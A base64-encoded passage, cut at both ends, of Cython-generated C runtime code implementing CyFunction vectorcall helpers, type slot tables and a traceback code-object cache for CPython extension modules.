iljeWZ1bmMpLT5tX3NlbGY7CiNlbmRpZgogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGlmICh1bmxpa2VseShuYXJncyAhPSAxKSkgewogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoCiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIGV4YWN0bHkgb25lIGFyZ3VtZW50IiwgbmFyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuIG1ldGgoc2VsZiwgYXJnc1swXSk7Cn0Kc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7CiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTAogICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjsKI2Vsc2UKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTsKI2VuZGlmCiAgICBQeU9iamVjdCAqc2VsZjsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpOwogICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDsKI2VuZGlmCiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHsKICAgIGNhc2UgMToKICAgICAgICBzZWxmID0gYXJnc1swXTsKICAgICAgICBhcmdzICs9IDE7CiAgICAgICAgbmFyZ3MgLT0gMTsKICAgICAgICBicmVhazsKICAgIGNhc2UgMDoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmV0dXJuICgoX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKSh2b2lkKCopKHZvaWQpKW1ldGgpKHNlbGYsIGFyZ3MsIG5hcmdzLCBrd25hbWVzKTsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKQp7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7CiAgICBQeVR5cGVPYmplY3QgKmNscyA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihjeWZ1bmMpOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7CiNlbHNlCiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7CiNlbmRpZgogICAgUHlPYmplY3QgKnNlbGY7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7CiNlbmRpZgogICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIE5VTEwpKSB7CiAgICBjYXNlIDE6CiAgICAgICAgc2VsZiA9IGFyZ3NbMF07CiAgICAgICAgYXJncyArPSAxOwogICAgICAgIG5hcmdzIC09IDE7CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIDA6CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7CiNlbmRpZgogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHJldHVybiAoKF9fUHl4X1B5Q01ldGhvZCkodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBjbHMsIGFyZ3MsIChzaXplX3QpbmFyZ3MsIGt3bmFtZXMpOwp9CiNlbmRpZgpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHNbXSA9IHsKICAgIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fZGVhbGxvY30sCiAgICB7UHlfdHBfcmVwciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3JlcHJ9LAogICAge1B5X3RwX2NhbGwsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2R9LAogICAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fdHJhdmVyc2V9LAogICAge1B5X3RwX2NsZWFyLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fY2xlYXJ9LAogICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfQ3lGdW5jdGlvbl9tZXRob2RzfSwKICAgIHtQeV90cF9tZW1iZXJzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc30sCiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fZ2V0c2V0c30sCiAgICB7UHlfdHBfZGVzY3JfZ2V0LCAodm9pZCAqKV9fUHl4X1B5TWV0aG9kX05ld30sCiAgICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zcGVjID0gewogICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJjeXRob25fZnVuY3Rpb25fb3JfbWV0aG9kIiwKICAgIHNpemVvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KSwKICAgIDAsCiNpZmRlZiBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SCiAgICBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SIHwKI2VuZGlmCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgZGVmaW5lZChQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCkKICAgIFB5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHwKI2VsaWYgZGVmaW5lZChfUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwpCiAgICBfUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwgfAojZW5kaWYKI2VuZGlmIC8vIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwCiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfAojZW5kaWYKICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfQkFTRVRZUEUsCiAgICBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zbG90cwp9OwpzdGF0aWMgaW50IF9fcHl4X0N5RnVuY3Rpb25faW5pdChQeU9iamVjdCAqbW9kdWxlKSB7CiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpOwogICAgbXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9IF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKAogICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zcGVjLCBOVUxMKTsKICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlID09IE5VTEwpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdERlZmF1bHRzKFB5T2JqZWN0ICpmdW5jLCBQeVR5cGVPYmplY3QgKmRlZmF1bHRzX3R5cGUpIHsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwogICAgbS0+ZGVmYXVsdHMgPSBQeU9iamVjdF9DYWxsT2JqZWN0KChQeU9iamVjdCopZGVmYXVsdHNfdHlwZSwgTlVMTCk7IC8vIF9QeU9iamVjdF9OZXcoZGVmYXVsdHNfdHlwZSk7CiAgICBpZiAodW5saWtlbHkoIW0tPmRlZmF1bHRzKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJldHVybiBtLT5kZWZhdWx0czsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnR1cGxlKSB7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYzsKICAgIG0tPmRlZmF1bHRzX3R1cGxlID0gdHVwbGU7CiAgICBQeV9JTkNSRUYodHVwbGUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0t3RGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHsKICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwogICAgbS0+ZGVmYXVsdHNfa3dkaWN0ID0gZGljdDsKICAgIFB5X0lOQ1JFRihkaWN0KTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0QW5ub3RhdGlvbnNEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqZGljdCkgewogICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7CiAgICBtLT5mdW5jX2Fubm90YXRpb25zID0gZGljdDsKICAgIFB5X0lOQ1JFRihkaWN0KTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9OZXcoUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7CiAgICBQeU9iamVjdCAqb3AgPSBfX1B5eF9DeUZ1bmN0aW9uX0luaXQoCiAgICAgICAgUHlPYmplY3RfR0NfTmV3KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKSwKICAgICAgICBtbCwgZmxhZ3MsIHF1YWxuYW1lLCBjbG9zdXJlLCBtb2R1bGUsIGdsb2JhbHMsIGNvZGUKICAgICk7CiAgICBpZiAobGlrZWx5KG9wKSkgewogICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKG9wKTsKICAgIH0KICAgIHJldHVybiBvcDsKfQoKCiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLICYmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRQpzdGF0aWMgaW50IF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgaW50IGNfbGluZSkgewogICAgUHlPYmplY3QgKnVzZV9jbGluZTsKICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIFB5T2JqZWN0ICoqY3l0aG9uX3J1bnRpbWVfZGljdDsKI2VuZGlmCiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih0c3RhdGUpOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSkpIHsKICAgICAgICByZXR1cm4gY19saW5lOwogICAgfQogICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGN5dGhvbl9ydW50aW1lX2RpY3QgPSBfUHlPYmplY3RfR2V0RGljdFB0cihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSk7CiAgICBpZiAobGlrZWx5KGN5dGhvbl9ydW50aW1lX2RpY3QpKSB7CiAgICAgICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTigqY3l0aG9uX3J1bnRpbWVfZGljdCk7CiAgICAgICAgX19QWVhfUFlfRElDVF9MT09LVVBfSUZfTU9ESUZJRUQoCiAgICAgICAgICAgIHVzZV9jbGluZSwgKmN5dGhvbl9ydW50aW1lX2RpY3QsCiAgICAgICAgICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKCpjeXRob25fcnVudGltZV9kaWN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xpbmVfaW5fdHJhY2ViYWNrKSkKICAgICAgICBQeV9YSU5DUkVGKHVzZV9jbGluZSk7CiAgICAgICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIH0gZWxzZQojZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKnVzZV9jbGluZV9vYmogPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjayk7CiAgICAgIGlmICh1c2VfY2xpbmVfb2JqKSB7CiAgICAgICAgdXNlX2NsaW5lID0gUHlPYmplY3RfTm90KHVzZV9jbGluZV9vYmopID8gUHlfRmFsc2UgOiBQeV9UcnVlOwogICAgICAgIFB5X0lOQ1JFRih1c2VfY2xpbmUpOwogICAgICAgIFB5X0RFQ1JFRih1c2VfY2xpbmVfb2JqKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIHVzZV9jbGluZSA9IE5VTEw7CiAgICAgIH0KICAgIH0KICAgIGlmICghdXNlX2NsaW5lKSB7CiAgICAgICAgY19saW5lID0gMDsKICAgICAgICAodm9pZCkgUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaywgUHlfRmFsc2UpOwogICAgfQogICAgZWxzZSBpZiAodXNlX2NsaW5lID09IFB5X0ZhbHNlIHx8ICh1c2VfY2xpbmUgIT0gUHlfVHJ1ZSAmJiBQeU9iamVjdF9Ob3QodXNlX2NsaW5lKSAhPSAwKSkgewogICAgICAgIGNfbGluZSA9IDA7CiAgICB9CiAgICBQeV9YREVDUkVGKHVzZV9jbGluZSk7CiAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spOwogICAgcmV0dXJuIGNfbGluZTsKfQojZW5kaWYKCgpzdGF0aWMgaW50IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMsIGludCBjb3VudCwgaW50IGNvZGVfbGluZSkgewogICAgaW50IHN0YXJ0ID0gMCwgbWlkID0gMCwgZW5kID0gY291bnQgLSAxOwogICAgaWYgKGVuZCA+PSAwICYmIGNvZGVfbGluZSA+IGVudHJpZXNbZW5kXS5jb2RlX2xpbmUpIHsKICAgICAgICByZXR1cm4gY291bnQ7CiAgICB9CiAgICB3aGlsZSAoc3RhcnQgPCBlbmQpIHsKICAgICAgICBtaWQgPSBzdGFydCArIChlbmQgLSBzdGFydCkgLyAyOwogICAgICAgIGlmIChjb2RlX2xpbmUgPCBlbnRyaWVzW21pZF0uY29kZV9saW5lKSB7CiAgICAgICAgICAgIGVuZCA9IG1pZDsKICAgICAgICB9IGVsc2UgaWYgKGNvZGVfbGluZSA+IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHsKICAgICAgICAgICAgIHN0YXJ0ID0gbWlkICsgMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gbWlkOwogICAgICAgIH0KICAgIH0KICAgIGlmIChjb2RlX2xpbmUgPD0gZW50cmllc1ttaWRdLmNvZGVfbGluZSkgewogICAgICAgIHJldHVybiBtaWQ7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBtaWQgKyAxOwogICAgfQp9CnN0YXRpYyBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqX19weXhfX2ZpbmRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSkgewogICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0OwogICAgaW50IHBvczsKICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSB8fCB1bmxpa2VseSghY29kZV9jYWNoZS0+ZW50cmllcykpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIHBvcyA9IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoY29kZV9jYWNoZS0+ZW50cmllcywgY29kZV9jYWNoZS0+Y291bnQsIGNvZGVfbGluZSk7CiAgICBpZiAodW5saWtlbHkocG9zID49IGNvZGVfY2FjaGUtPmNvdW50KSB8fCB1bmxpa2VseShjb2RlX2NhY2hlLT5lbnRyaWVzW3Bvc10uY29kZV9saW5lICE9IGNvZGVfbGluZSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGNvZGVfb2JqZWN0ID0gY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfb2JqZWN0OwogICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTsKICAgIHJldHVybiBjb2RlX29iamVjdDsKfQpzdGF0aWMgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKl9fcHl4X2ZpbmRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgIUNZVEhPTl9BVE9NSUNTCiAgICAodm9pZClfX3B5eF9fZmluZF9jb2RlX29iamVjdDsKICAgIHJldHVybiBOVUxMOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvbid0IG1ha2UgaXQgdGhyZWFkLXNhZmUsIGp1c3QgbWlzcy4KI2Vsc2UKICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkX2NvdW50ID0gX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpOwogICAgaWYgKG9sZF9jb3VudCA8IDApIHsKICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCk7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiNlbmRpZgogICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUgKnJlc3VsdCA9IF9fcHl4X19maW5kX2NvZGVfb2JqZWN0KGNvZGVfY2FjaGUsIGNvZGVfbGluZSk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpOwojZW5kaWYKICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CnN0YXRpYyB2b2lkIF9fcHl4X19pbnNlcnRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KQp7CiAgICBpbnQgcG9zLCBpOwogICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMgPSBjb2RlX2NhY2hlLT5lbnRyaWVzOwogICAgaWYgKHVubGlrZWx5KCFjb2RlX2xpbmUpKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgaWYgKHVubGlrZWx5KCFlbnRyaWVzKSkgewogICAgICAgIGVudHJpZXMgPSAoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqKVB5TWVtX01hbGxvYyg2NCpzaXplb2YoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkpKTsKICAgICAgICBpZiAobGlrZWx5KGVudHJpZXMpKSB7CiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMgPSBlbnRyaWVzOwogICAgICAgICAgICBjb2RlX2NhY2hlLT5tYXhfY291bnQgPSA2NDsKICAgICAgICAgICAgY29kZV9jYWNoZS0+Y291bnQgPSAxOwogICAgICAgICAgICBlbnRyaWVzWzBdLmNvZGVfbGluZSA9IGNvZGVfbGluZTsKICAgICAgICAgICAgZW50cmllc1swXS5jb2RlX29iamVjdCA9IGNvZGVfb2JqZWN0OwogICAgICAgICAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpOwogICAgICAgIH0KICAgICAgICByZXR1cm47CiAgICB9CiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpOwogICAgaWYgKChwb3MgPCBjb2RlX2NhY2hlLT5jb3VudCkgJiYgdW5saWtlbHkoY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfbGluZSA9PSBjb2RlX2xpbmUpKSB7CiAgICAgICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIHRtcCA9IGVudHJpZXNbcG9zXS5jb2RlX29iamVjdDsKICAgICAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDsKICAgICAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmIChjb2RlX2NhY2hlLT5jb3VudCA9PSBjb2RlX2NhY2hlLT5tYXhfY291bnQpIHsKICAgICAgICBpbnQgbmV3X21heCA9IGNvZGVfY2FjaGUtPm1heF9jb3VudCArIDY0OwogICAgICAgIGVudHJpZXMgPSAoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqKVB5TWVtX1JlYWxsb2MoCiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMsICgoc2l6ZV90KW5ld19tYXgpICogc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFlbnRyaWVzKSkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMgPSBlbnRyaWVzOwogICAgICAgIGNvZGVfY2FjaGUtPm1heF9jb3VudCA9IG5ld19tYXg7CiAgICB9CiAgICBmb3IgKGk9Y29kZV9jYWNoZS0+Y291bnQ7IGk+cG9zOyBpLS0pIHsKICAgICAgICBlbnRyaWVzW2ldID0gZW50cmllc1tpLTFdOwogICAgfQogICAgZW50cmllc1twb3NdLmNvZGVfbGluZSA9IGNvZGVfbGluZTsKICAgIGVudHJpZXNbcG9zXS5jb2RlX29iamVjdCA9IGNvZGVfb2JqZWN0OwogICAgY29kZV9jYWNoZS0+Y291bnQrKzsKICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7Cn0Kc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgIUNZVEhPTl9BVE9NSUNTCiAgICAodm9pZClfX3B5eF9faW5zZXJ0X2NvZGVfb2JqZWN0OwogICAgcmV0dXJuOyAvLyBNb3N0IGltcGxlbWVudGF0aW9uIHNob3VsZCBoYXZlIGF0b21pY3MuIEJ1dCBvdGhlcndpc2UsIGRvbid0IG1ha2UgaXQgdGhyZWFkLXNhZmUsIGp1c3QgZmFpbC4KI2Vsc2UKICAgIHN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgKmNvZGVfY2FjaGUgPSAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZV9jYWNoZTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgZXhwZWN0ZWQgPSAwOwogICAgaWYgKCFfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQsICZleHBlY3RlZCwgSU5UX01JTikpIHsKICAgICAgICByZXR1cm47CiAgICB9CiNlbmRpZgogICAgX19weXhfX2luc2VydF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUsIGNvZGVfb2JqZWN0KTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5